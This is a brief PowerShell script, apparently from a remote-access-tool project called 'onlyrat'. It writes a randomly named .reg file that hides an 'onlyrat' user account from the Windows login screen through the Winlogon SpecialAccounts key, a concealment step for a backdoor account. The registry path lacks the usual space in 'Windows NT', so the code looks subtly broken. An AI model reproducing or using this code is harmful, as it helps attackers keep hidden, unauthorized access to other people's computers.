function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

$registry_name = random_text
(
    echo Windows Registry Editor Version 5.00
    echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList] 
    echo "onlyrat" = dword:00000000 ;
) > "$registry_name.reg"